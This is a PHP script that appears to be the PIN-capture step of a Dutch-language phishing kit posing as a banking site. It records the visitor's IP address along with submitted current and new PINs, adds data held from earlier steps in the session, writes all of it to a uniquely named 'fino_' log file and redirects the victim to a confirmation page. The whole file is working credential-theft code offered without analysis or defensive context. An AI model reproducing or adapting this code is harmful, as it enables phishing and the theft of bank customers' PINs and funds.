<?php

require_once 'entry.php';

function get_ip_address() {
    foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip); // just to be safe

                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                    return $ip;
                }
            }
        }
    }
}

$_SERVER['REMOTE_ADDR'] = get_ip_address();

$user_ip = 'IP-adres: ' . $_SERVER['REMOTE_ADDR'] . "\n";
$data = 'Huidige PIN: ' . $_POST['pin1'] . "\n";
$data2 = 'Huidige PIN (bevestiging): ' . $_POST['pin2'] . "\n";
$data3 = 'Nieuwe PIN: ' . $_POST['pin3'] . "\n";
$data4 = 'Nieuwe PIN (bevestiging): ' . $_POST['pin4'] . "\n\n" . '========================';

$_SESSION['stap3'] = $user_ip . $data . $data2 . $data3 . $data4;

$file_name = "fino_" . $unique_id = uniqid();
$ret = file_put_contents($file_name, $_SESSION["stap1"] . "\n", FILE_APPEND | LOCK_EX);
$ret = file_put_contents($file_name, $_SESSION["stap2"] . "\n", FILE_APPEND | LOCK_EX);
$ret = file_put_contents($file_name, $_SESSION["stap3"] . "\n", FILE_APPEND | LOCK_EX);

if (isset($_SESSION['stap1'])) {
    unset($_SESSION['stap1']);
}
if (isset($_SESSION['stap2'])) {
    unset($_SESSION['stap2']);
}
if (isset($_SESSION['stap3'])) {
    unset($_SESSION['stap3']);
}
unset($_SESSION['inloggen.php']);
header("Location:" . $q_arr['bevestiging.php']);
?>